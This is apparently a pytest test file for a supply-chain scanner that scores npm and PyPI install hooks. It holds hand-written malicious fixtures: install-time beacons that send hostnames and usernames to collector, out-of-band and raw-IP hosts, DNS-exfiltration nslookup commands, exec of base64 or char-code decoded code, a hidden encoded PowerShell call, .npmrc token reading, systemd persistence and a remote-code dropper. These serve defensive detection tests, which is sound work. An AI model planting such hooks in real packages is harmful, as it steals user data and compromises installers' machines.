"""Install hooks are high when their code is suspicious, not merely present.

Benchmark run 1 (tune split, triage cause 2): known-malicious npm / PyPI packages whose
only bad behaviour is install-time code scored a medium "auto-runs on install", so the
answer stayed Safe. Most are dependency-confusion probes: a preinstall that sends the
host name and user name to ``*.oast.fun``, a ``setup.py`` cmdclass that posts
``socket.gethostname()`` to pipedream, ``exec(''.join(map(chr, [...])))``.

A hook is now high (Review) when its code (the inline command, the local files it runs
and what those require one level down) does one of:

* collects host / user details AND talks to the network;
* names a callback-collector or raw-IP host;
* runs obfuscated / decoded code.

Ordinary hooks keep their medium: node-gyp builds, a binary download from the
project's own release host, husky, a banner, native ``build_ext``. The fixtures below
are written for these tests (shapes from the benchmark tune split); no dataset sample
is copied.
"""
from __future__ import annotations

import io
import json
import tarfile

import pytest

from src.scanner.artifact_fetch import npm_result_from_tarball
from src.scanner.artifact_scan import detect_pypi_install_exec
from src.scanner.install_signals import js_signals, shell_signals, suspicious_reason
from src.scanner.scan import ScanResult, _scan_install_hooks, apply_artifact_scan

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def _tgz(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for path, text in files.items():
            data = text.encode()
            ti = tarfile.TarInfo("package/" + path)
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def _npm_hook_findings(scripts: dict, files: dict[str, str], **top) -> list:
    body = {"name": "probe-pkg", "version": "1.0.0", "main": "index.js", "scripts": scripts}
    body.update(top)
    tree = {"package.json": json.dumps(body, indent=2)}
    tree.setdefault("index.js", "module.exports = 1;\n")
    tree.update(files)
    fetched = npm_result_from_tarball("probe-pkg", "1.0.0", _tgz(tree))
    result = ScanResult(repo="npm:probe-pkg", stars=0, description="", framework="")
    apply_artifact_scan(result, "npm", fetched)
    return [f for f in result.findings if f.category == "install_hook"]


def _sev(findings: list) -> list[str]:
    return [f.severity for f in findings]


BEACON_JS = """\
const os = require('os');
const https = require('https');
const info = { h: os.hostname(), u: os.userInfo().username, d: process.cwd() };
const req = https.request({ hostname: 'collector.example.net', path: '/?' +
  encodeURIComponent(JSON.stringify(info)), method: 'GET' }, () => {});
req.on('error', () => {});
req.end();
"""

DNS_BEACON_JS = """\
const dns = require('dns');
const os = require('os');
const label = Buffer.from(os.userInfo().username).toString('hex');
dns.lookup(label + '.abcdef.oast.fun', () => {});
"""

OOB_ONLY_JS = """\
const https = require('https');
https.get('https://eo1234abcd.m.pipedream.net/ping', () => {});
"""

RAW_IP_JS = """\
const http = require('http');
http.get('http://203.0.113.7:8080/i?p=' + process.cwd(), () => {});
"""

OBFUSCATED_JS = "var _0x1a2b=['x'];" + "".join(
    f"function _0x{n:04x}(){{return _0x1a2b[0];}}" for n in range(0x3c00, 0x3c10))

EVAL_DECODED_JS = """\
const p = Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString();
eval(p);
"""

# esbuild / sharp-style: download a platform binary from the project's release host.
BINARY_DOWNLOAD_JS = """\
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');
const pkg = `@probe/${os.platform()}-${os.arch()}`;
const url = `https://github.com/probe/probe/releases/download/v1.0.0/${pkg}.tgz`;
https.get(url, (res) => res.pipe(fs.createWriteStream(path.join(__dirname, 'bin.tgz'))));
"""

# a CLI that prints where it was installed, using the home dir (not recon)
BANNER_JS = """\
const os = require('os');
console.log('probe installed for ' + os.platform() + ' in ' + os.homedir());
"""


# ---------------------------------------------------------------------------
# npm: the files a hook runs
# ---------------------------------------------------------------------------


class TestNpmSuspiciousHookIsHigh:
    @pytest.mark.parametrize("body", [BEACON_JS, DNS_BEACON_JS, OOB_ONLY_JS, RAW_IP_JS,
                                      OBFUSCATED_JS, EVAL_DECODED_JS])
    def test_preinstall_file(self, body):
        f = _npm_hook_findings({"preinstall": "node index.js"}, {"index.js": body})
        assert _sev(f) == ["high"], f
        assert f[0].name.startswith("npm 'preinstall' lifecycle script (")
        assert "auto-runs on install" not in f[0].name

    def test_reason_names_the_behaviour(self):
        f = _npm_hook_findings({"postinstall": "node lib/post.js"}, {"lib/post.js": BEACON_JS})
        assert f[0].name == ("npm 'postinstall' lifecycle script "
                             "(sends host or user details over the network at install)")

    def test_followed_through_npm_run(self):
        f = _npm_hook_findings({"postinstall": "npm run setup", "setup": "node s.js"},
                               {"s.js": BEACON_JS})
        assert _sev(f) == ["high"]

    def test_followed_through_a_local_require(self):
        f = _npm_hook_findings({"install": "node hook.js"},
                               {"hook.js": "require('./lib/b');\n", "lib/b.js": BEACON_JS})
        assert _sev(f) == ["high"]

    def test_bun_run(self):
        f = _npm_hook_findings({"preinstall": "bun run index.js"}, {"index.js": BEACON_JS})
        assert _sev(f) == ["high"]

    def test_shell_file(self):
        f = _npm_hook_findings({"preinstall": "sh scripts/t.sh"},
                               {"scripts/t.sh": "#!/bin/sh\nnslookup \"$(whoami).x.oast.pro\"\n"})
        assert _sev(f) == ["high"]


class TestNpmOrdinaryHookStaysMedium:
    @pytest.mark.parametrize("body", [BINARY_DOWNLOAD_JS, BANNER_JS,
                                      "require('child_process').execSync('node-gyp rebuild');\n",
                                      "module.exports = 1;\n"])
    def test_ordinary_file(self, body):
        f = _npm_hook_findings({"postinstall": "node install.js"}, {"install.js": body})
        assert _sev(f) == ["medium"], f
        assert "auto-runs on install" in f[0].name

    def test_recon_in_a_file_the_hook_does_not_run(self):
        # a test helper elsewhere in the tarball does not make the hook suspicious
        f = _npm_hook_findings({"postinstall": "node install.js"},
                               {"install.js": BANNER_JS, "test/beacon.js": BEACON_JS})
        assert _sev(f) == ["medium"]

    def test_husky_and_node_gyp_inline(self):
        assert _sev(_npm_hook_findings({"postinstall": "husky install"}, {})) == ["medium"]
        assert _sev(_npm_hook_findings({"install": "node-gyp rebuild"}, {})) == ["medium"]

    def test_missing_file_is_not_escalated(self):
        assert _sev(_npm_hook_findings({"postinstall": "node gone.js"}, {})) == ["medium"]


# ---------------------------------------------------------------------------
# npm: inline commands (every surface, not only artifacts)
# ---------------------------------------------------------------------------


class TestInlineCommand:
    @pytest.mark.parametrize("cmd", [
        "nslookup `whoami`.abc123.oast.fun",
        "host=$(hostname | base64); nslookup $host.abc.oast.pro",
        "ping -c 1 $(whoami).abc.interact.sh",
    ])
    def test_dns_beacon_is_high_or_worse(self, cmd):
        f = _scan_install_hooks(json.dumps({"scripts": {"preinstall": cmd}}), "package.json")
        assert _sev(f) in (["high"], ["critical"]), cmd

    def test_nslookup_beacon_is_high(self):
        f = _scan_install_hooks(json.dumps(
            {"scripts": {"preinstall": "nslookup `whoami`.abc123.oast.fun"}}), "package.json")
        assert _sev(f) == ["high"]

    @pytest.mark.parametrize("cmd", ["node install.js", "husky install", "node-gyp rebuild",
                                     "echo hostname"])
    def test_ordinary_inline_stays_medium(self, cmd):
        f = _scan_install_hooks(json.dumps({"scripts": {"postinstall": cmd}}), "package.json")
        assert _sev(f) == ["medium"], cmd


# ---------------------------------------------------------------------------
# PyPI setup.py
# ---------------------------------------------------------------------------

CMDCLASS_BEACON = """\
import getpass, socket
import requests
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        install.run(self)
        requests.get("https://collector.example.net/",
                     params={"h": socket.gethostname(), "u": getpass.getuser()})

setup(name="probe", version="1.0", cmdclass={"install": CustomInstall})
"""

DNS_EXFIL_SETUP = """\
import socket, getpass
from setuptools import setup
label = (socket.gethostname() + "." + getpass.getuser()).encode().hex()
socket.getaddrinfo(label + ".abc.example.net", 80)
setup(name="probe")
"""

OOB_SETUP = """\
import requests
from setuptools import setup
requests.post("https://abc123.oastify.com/x", data="installed")
setup(name="probe")
"""

CHR_EXEC_SETUP = """\
exec("".join(map(chr, [112, 114, 105, 110, 116, 40, 49, 41])))
from setuptools import setup
setup(name="probe")
"""

B64_EXEC_SETUP = """\
from base64 import b64decode
exec(b64decode("cHJpbnQoMSk="))
from setuptools import setup
setup(name="probe")
"""

POWERSHELL_STRING_SETUP = """\
import subprocess
from setuptools import setup
subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand ZQBjAGgAbwA=', shell=False)
setup(name="probe")
"""


class TestSetupPySuspiciousIsHigh:
    @pytest.mark.parametrize("src", [CMDCLASS_BEACON, DNS_EXFIL_SETUP, OOB_SETUP,
                                     CHR_EXEC_SETUP, B64_EXEC_SETUP])
    def test_high(self, src):
        f = detect_pypi_install_exec(src, "setup.py")
        assert _sev(f) == ["high"], f

    def test_reason_in_the_name(self):
        f = detect_pypi_install_exec(CMDCLASS_BEACON, "setup.py")
        assert f[0].name == "setup.py sends host or user details over the network at install"

    def test_command_line_in_one_string_is_not_a_build_step(self):
        f = detect_pypi_install_exec(POWERSHELL_STRING_SETUP, "setup.py")
        assert _sev(f) == ["high"]


class TestSetupPyOrdinaryStaysAsItWas:
    def test_version_read_exec_is_nothing(self):
        src = ("exec(open('probe/_version.py').read())\n"
               "from setuptools import setup\nsetup(name='probe')\n")
        assert detect_pypi_install_exec(src, "setup.py") == []

    def test_metadata_urls_are_not_code(self):
        src = ("from setuptools import setup\nsetup(name='probe', url='http://203.0.113.7/',"
               " project_urls={'Hook': 'https://x.pipedream.net'})\n")
        assert detect_pypi_install_exec(src, "setup.py") == []

    def test_plain_build_ext_cmdclass_is_medium(self):
        src = ("from setuptools import setup\nfrom setuptools.command.build_ext import "
               "build_ext\nclass B(build_ext):\n    def run(self):\n        build_ext.run(self)\n"
               "setup(name='probe', cmdclass={'build_ext': B})\n")
        assert _sev(detect_pypi_install_exec(src, "setup.py")) == ["medium"]

    def test_fixed_argv_helper_is_medium(self):
        src = ("import subprocess, sys\nfrom setuptools import setup\n"
               "subprocess.check_call([sys.executable, 'tools/gen.py'])\nsetup(name='probe')\n")
        assert _sev(detect_pypi_install_exec(src, "setup.py")) == ["medium"]

    def test_hostname_without_network_is_not_escalated(self):
        src = ("import socket\nfrom setuptools import setup\nHOST = socket.gethostname()\n"
               "setup(name='probe')\n")
        assert detect_pypi_install_exec(src, "setup.py") == []

    def test_recon_under_a_publish_guard_is_ignored(self):
        src = ("import sys, socket, requests\nfrom setuptools import setup\n"
               "if sys.argv[-1] == 'publish':\n"
               "    requests.post('https://x.oast.fun', data=socket.gethostname())\n"
               "setup(name='probe')\n")
        assert detect_pypi_install_exec(src, "setup.py") == []

    def test_plain_single_string_command_stays_medium(self):
        src = ("import subprocess\nfrom setuptools import setup\n"
               "subprocess.check_call('make -C src lib')\nsetup(name='probe')\n")
        assert _sev(detect_pypi_install_exec(src, "setup.py")) == ["medium"]


# ---------------------------------------------------------------------------
# signals
# ---------------------------------------------------------------------------


class TestSignals:
    def test_js(self):
        assert js_signals(BEACON_JS) >= {"net", "recon"}
        assert js_signals(BINARY_DOWNLOAD_JS) == {"net"}
        assert "recon" not in js_signals("spawn('x', {env: {...process.env, A: 1}})")
        assert "recon" in js_signals("post(JSON.stringify(process.env))")

    def test_shell(self):
        assert shell_signals("curl -s https://x.example/i?u=$(whoami)") >= {"net", "recon"}
        assert shell_signals("node-gyp rebuild") == set()

    def test_private_and_loopback_ips_are_not_oob(self):
        for url in ("http://127.0.0.1:3000", "http://10.0.0.4:5174", "http://192.168.1.2/"):
            assert "oob" not in js_signals(f"fetch('{url}')"), url
        assert "oob" in js_signals("fetch('http://198.51.100.20/x')")

    def test_reason_needs_both_net_and_recon(self):
        assert suspicious_reason({"recon"}) is None
        assert suspicious_reason({"net"}) is None
        assert suspicious_reason({"net", "recon"})

    def test_standalone_signals(self):
        assert "creds" in js_signals("read(path.join(home, '.npmrc')).match(/_authToken=/)")
        assert "persist" in js_signals("fs.writeFileSync(home + '/.config/systemd/user/x.service')")
        assert "dropper" in js_signals("w.write(b\"exec(urlopen('https://x.example/p').read())\")")
        for s in ({"creds"}, {"persist"}, {"dropper"}, {"oob"}, {"obfuscated"}):
            assert suspicious_reason(s), s


# ---------------------------------------------------------------------------
# second-round shapes (credential theft, persistence, inverted guard, dropper)
# ---------------------------------------------------------------------------

TOKEN_THEFT_JS = """\
const fs = require('fs'); const os = require('os'); const path = require('path');
const rc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
const m = rc.match(/:_authToken=(\\S+)/);
"""

PERSIST_JS = """\
const fs = require('fs'); const os = require('os'); const path = require('path');
const unit = path.join(os.homedir(), '.config', 'systemd', 'user', 'svc.service');
fs.writeFileSync(path.join(os.homedir(), '.config/systemd/user/svc.service'), 'x');
"""

INVERTED_GUARD_SETUP = """\
from sys import argv
from base64 import b64decode
from setuptools import setup
setup(name="probe")
if 'sdist' not in argv:
    exec(b64decode('cHJpbnQoMSk='))
"""

DROPPER_SETUP = """\
import os, tempfile
from setuptools import setup
p = os.path.join(tempfile.gettempdir(), 'x.py')
with open(p, 'wb') as f:
    f.write(b"from urllib.request import urlopen;exec(urlopen('https://paste.example/raw').read())")
setup(name="probe")
"""


class TestSecondRound:
    @pytest.mark.parametrize("body", [TOKEN_THEFT_JS, PERSIST_JS])
    def test_npm_hook_high(self, body):
        f = _npm_hook_findings({"postinstall": "node index.js"}, {"index.js": body})
        assert _sev(f) == ["high"], f

    def test_inverted_guard_body_is_install_path(self):
        assert _sev(detect_pypi_install_exec(INVERTED_GUARD_SETUP, "setup.py")) == ["high"]

    def test_inverted_guard_else_is_maintainer_path(self):
        src = ("import sys, os\nfrom setuptools import setup\n"
               "if sys.argv[-1] != 'publish':\n    pass\nelse:\n"
               "    os.system('twine upload dist/*')\nsetup(name='probe')\n")
        assert detect_pypi_install_exec(src, "setup.py") == []

    def test_dropper_constant(self):
        assert _sev(detect_pypi_install_exec(DROPPER_SETUP, "setup.py")) == ["high"]


# ---------------------------------------------------------------------------
# review of #436: speed bound, bundled-hook false positives, uname / environ, guards,
# transitive requires
# ---------------------------------------------------------------------------

_PATHOLOGICAL = {
    "dots": "a." * 500_000,
    "dashes": "a-" * 500_000,
    "hex": "0123456789abcdef" * 65_536,
    "spaces": " " * 1_000_000,
    "newlines": "\n" * 1_000_000,
    "ident": "a" * 1_000_000,
    "equals": "a=" * 500_000,
    "brackets": "[1," * 333_333,
}


class TestSignalSpeed:
    @pytest.mark.parametrize("name", sorted(_PATHOLOGICAL))
    @pytest.mark.parametrize("fn", [js_signals, shell_signals, "py", "common"])
    def test_one_megabyte_is_fast(self, name, fn):
        import time

        from src.scanner.install_signals import common_signals, py_signals
        f = {"py": py_signals, "common": common_signals}.get(fn, fn)
        text = _PATHOLOGICAL[name]
        t0 = time.monotonic()
        f(text)
        f("require('https');" + text + "os.hostname()")
        assert time.monotonic() - t0 < 2.0, (name, fn)

    def test_setup_py_large_string_is_fast(self):
        import time
        src = ("from setuptools import setup\nX = '" + "a." * 400_000 + "'\n"
               "setup(name='probe')\n")
        t0 = time.monotonic()
        detect_pypi_install_exec(src, "setup.py")
        assert time.monotonic() - t0 < 5.0


# Bundled / ordinary hooks the review found going medium -> high. All must stay medium.
BUNDLED_HOOKS = {
    "global_shim_charcode": (
        "var g = Function('return this')();\nvar h = 0;\n"
        "for (var i = 0; i < s.length; i++) h = (h << 5) - h + s.charCodeAt(i);\n"),
    "new_function_digest": (
        "const g = new Function('return this')();\nconst crypto = require('crypto');\n"
        "const d = crypto.createHash('sha256').update(x).digest('base64');\n"),
    "eval_require_ansi_banner": (
        "const r = eval('require');\nconst fs = r('fs');\n"
        "console.log('\\x1b[32mInstalled\\x1b[0m');\n"),
    "env_keys_npm_config": (
        "const https = require('https');\n"
        "const cfg = Object.keys(process.env).filter(k => k.startsWith('npm_config_'));\n"
        "https.get('https://registry.npmjs.org/probe', () => {});\n"),
    "userinfo_homedir": (
        "const https = require('https'); const os = require('os');\n"
        "const cache = require('path').join(os.userInfo().homedir, '.cache', 'probe');\n"
        "https.get('https://github.com/probe/probe/releases/download/v1/bin', () => {});\n"),
    "cli_whoami_command": (
        "const https = require('https');\n"
        "program.command('whoami').description('print the logged-in account');\n"
        "https.get('https://api.example.com/v1/ping', () => {});\n"),
}


class TestBundledHooksStayMedium:
    @pytest.mark.parametrize("name", sorted(BUNDLED_HOOKS))
    def test_medium(self, name):
        f = _npm_hook_findings({"postinstall": "node dist/postinstall.js"},
                               {"dist/postinstall.js": BUNDLED_HOOKS[name]})
        assert _sev(f) == ["medium"], (name, f)

    def test_real_shapes_still_count(self):
        assert "obfuscated" in js_signals("eval(atob('Y29uc29sZS5sb2coMSk='))")
        assert "obfuscated" in js_signals("new Function(Buffer.from(p, 'base64').toString())()")
        assert "obfuscated" in js_signals(
            "eval(function(s,n){return s.replace(/x/g,function(c){return "
            "String.fromCharCode(c)})}([40,105,97]))")
        assert "recon" in js_signals("const u = os.userInfo(); send(u.username)")
        assert "recon" in js_signals("const { username } = os.userInfo();")
        assert "recon" in js_signals("execSync('whoami').toString()")
        assert "recon" not in js_signals("Object.keys(process.env)")


class TestSetupPyUnameAndEnviron:
    @pytest.mark.parametrize("expr", ["platform.uname().nodename", "platform.uname()[1]",
                                      "str(platform.uname())", "os.uname().nodename"])
    def test_uname_node_name_is_recon(self, expr):
        src = ("import os, platform, requests\nfrom setuptools import setup\n"
               f"requests.get('https://x.example.net/', params={{'u': {expr}}})\n"
               "setup(name='probe')\n")
        assert _sev(detect_pypi_install_exec(src, "setup.py")) == ["high"], expr

    def test_uname_machine_with_release_download_is_not(self):
        src = ("import platform\nfrom urllib.request import urlretrieve\n"
               "from setuptools import setup\nm = platform.uname().machine\n"
               "def fetch():\n    urlretrieve('https://github.com/probe/probe/releases/"
               "download/v1/lib-' + m + '.so', 'lib.so')\nsetup(name='probe')\n")
        for f in detect_pypi_install_exec(src, "setup.py"):
            assert "host or user" not in f.name and "host or user" not in f.snippet

    @pytest.mark.parametrize("expr", ["os.environ.copy()", "dict(os.environ, CC='clang')"])
    def test_environment_copy_is_not_recon(self, expr):
        src = ("import os, requests, subprocess, sys\nfrom setuptools import setup\n"
               f"env = {expr}\nsubprocess.check_call([sys.executable, 'gen.py'], env=env)\n"
               "requests.get('https://example.org/data.json')\nsetup(name='probe')\n")
        f = detect_pypi_install_exec(src, "setup.py")
        assert all("host or user" not in x.snippet and "host or user" not in x.name
                   for x in f), f

    @pytest.mark.parametrize("expr", ["json.dumps(os.environ)", "str(os.environ)"])
    def test_serialised_environment_is_recon(self, expr):
        src = ("import os, json, requests\nfrom setuptools import setup\n"
               f"requests.post('https://x.example.net/', data={expr})\nsetup(name='probe')\n")
        assert _sev(detect_pypi_install_exec(src, "setup.py")) == ["high"], expr


class TestGuardEvasions:
    BEACON = ("    urlopen('https://x.example.net/?h=' + socket.gethostname())\n")

    @pytest.mark.parametrize("test", ["__name__ == '__main__'", "sys.argv",
                                      "not 'sdist' in sys.argv", "'install' in sys.argv",
                                      "len(sys.argv) > 1 or True"])
    def test_install_path_tests(self, test):
        src = ("import sys, socket\nfrom urllib.request import urlopen\n"
               "from setuptools import setup\n" f"if {test}:\n" + self.BEACON
               + "setup(name='probe')\n")
        assert detect_pypi_install_exec(src, "setup.py") != [], test

    @pytest.mark.parametrize("test", ["sys.argv[-1] == 'publish'", "'upload' in sys.argv",
                                      "sys.argv[1] in ('sdist', 'upload')",
                                      "len(sys.argv) > 1 and sys.argv[1] == 'release'"])
    def test_publish_only_tests_stay_guarded(self, test):
        src = ("import sys, socket\nfrom urllib.request import urlopen\n"
               "from setuptools import setup\n" f"if {test}:\n" + self.BEACON
               + "setup(name='probe')\n")
        assert detect_pypi_install_exec(src, "setup.py") == [], test


class TestTransitiveRequires:
    def test_three_levels_and_dirname_forms(self):
        f = _npm_hook_findings(
            {"postinstall": "node a.js"},
            {"a.js": "require(__dirname + '/lib/b.js');\n",
             "lib/b.js": "const path = require('path');\nrequire(path.join(__dirname, 'c'));\n",
             "lib/c.js": "require(`${__dirname}/d.js`);\n",
             "lib/d.js": BEACON_JS})
        assert _sev(f) == ["high"], f

    def test_depth_cap(self):
        files = {f"m{i}.js": f"require('./m{i + 1}');\n" for i in range(8)}
        files["m8.js"] = BEACON_JS
        f = _npm_hook_findings({"postinstall": "node m0.js"}, files)
        assert _sev(f) == ["medium"], f
